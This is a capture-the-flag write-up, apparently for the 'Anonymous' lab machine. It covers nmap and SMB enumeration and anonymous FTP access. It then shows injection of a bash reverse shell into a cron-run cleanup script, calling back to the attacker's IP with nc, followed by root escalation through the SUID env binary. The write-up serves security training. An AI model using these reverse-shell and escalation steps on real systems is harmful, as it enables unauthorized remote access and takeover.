Anonumous
===

###  PWN

- [x] Enumerate the machine.  How many ports are open?
As always, we can use namp to enumerate open ports.  
`nmap -sV -sC 10.10.11.170`  
```
Starting Nmap 7.60 ( https://nmap.org ) at 2022-11-04 06:15 GMT
Nmap scan report for ip-10-10-11-170.eu-west-1.compute.internal (10.10.11.170)
Host is up (0.0010s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)   <---can use anonymous login!!
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeabl                                                                  e]
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.27.128
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 5
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protoco                                                                  l 2.0)
| ssh-hostkey:
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (EdDSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
MAC Address: 02:88:90:5A:E3:A3 (Unknown)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknow                                                                  n> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2022-11-04T06:15:52+00:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-11-04 06:15:52
|_  start_date: 1600-12-31 23:58:45

Service detection performed. Please report any incorrect results at https://nmap                                                                  .org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.41 seconds
```
- [x] What service is running on port 21?  
21 port is ftp
- [x] What service is running on ports 139 and 445?  
139 and 445 are smb
- [x] There's a share on the user's computer.  What's it called?  
use smbclient to confirm share disk 
`smbclient -N -L 10.10.11.170`
![image](https://user-images.githubusercontent.com/67756786/199912107-a01e29dd-40db-4bb9-95f6-c5db6aabf0f2.png)

- [x] user.txt  
we use anonymous login ftp server.
`ftp -4 10.10.11.170`  
![image](https://user-images.githubusercontent.com/67756786/199905611-889abdec-ff61-474f-96f7-1cd73446c6fe.png)
use `ls` to check what file are there, and we found scripts directory.
![image](https://user-images.githubusercontent.com/67756786/199905651-9f7f2938-7811-4de5-a393-8914fe795f08.png)
Into the scripts, and we got three file.
![image](https://user-images.githubusercontent.com/67756786/199906253-23f369f4-fe45-4c8d-97aa-1bbecd0090b7.png)
download all file .
`mget *`
clean.sh
```
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```
removed_files.log
```
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
```
to_do.txt
```
I really need to disable the anonymous login...it's really not safe
```
We know clean.sh is delete file's shell script,and removed_files.log is log of clean.sh.to_do.txt is user's note.  
removed_files will be bigger over time,and i guess that crontab should be work for clean.sh.we can add bash reverse shell into
clean.sh,and upload to ftp server.  
Bash TCP  
`/bin/bash -l > /dev/tcp/10.10.27.128/9000 0<&1 2>&1`
listen to 9000 port and upload clean.sh  
`nc -lvnp 9000`  
into ftp server , put new clean.sh  
`put clean.sh`  
![image](https://user-images.githubusercontent.com/67756786/199908391-66377823-80e3-465d-a355-7f7482401cc5.png)
![image](https://user-images.githubusercontent.com/67756786/199908457-dcca7c04-60d7-4051-8131-6e496e50100e.png)

- [x] root.txt  
First, I use python pty to get better shell  
![image](https://user-images.githubusercontent.com/67756786/199910410-fff469dd-66dc-4b38-bb39-31e8c41b38ce.png)

we can confirm privilege now.  
But we don't have namelessone password  
`sudo -l`
![image](https://user-images.githubusercontent.com/67756786/199910678-b7b867d3-0e51-4bd9-8ed3-0059a4594b13.png)  

So we found SUID to privilege escalation.
`find / -perm -u=s -type f 2>/dev/null`  
![image](https://user-images.githubusercontent.com/67756786/199911319-67f783e4-b5de-4782-ac83-836995edcc3e.png)

I confirm all applicatoin to GTFOBins. If applicatoin use sudo to privilege escalation, we can't exploit, because we don't have
password.

I found env can use SUID to privilege escalation.  
![image](https://user-images.githubusercontent.com/67756786/199911445-dca2041f-f582-4448-b32f-ef466a98b2cb.png)
got root.txt
![image](https://user-images.githubusercontent.com/67756786/199911573-d639b774-e745-43ec-a5a5-3e93d7b8d0ea.png)

